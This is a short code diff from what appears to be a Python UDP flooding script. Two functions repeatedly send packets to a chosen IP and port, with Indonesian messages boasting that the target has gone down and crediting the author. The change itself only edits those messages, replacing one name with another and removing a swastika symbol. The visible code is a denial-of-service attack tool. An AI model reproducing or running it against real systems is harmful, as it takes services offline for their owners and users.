@@ -25,7 +25,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Down ga? Down lah masa kaga rafli dilawan")
+			print(i +" Down ga? Down lah masa kaga alvaro dilawan")
 		except:
 			print("[!] Error tod")
 
@@ -38,7 +38,7 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" lagi ngirim cok script by alvaro 卐")
+			print(i +" lagi ngirim cok script by alvaro ")
 		except:
 			print("[!] Error aokwowkkw ")
 
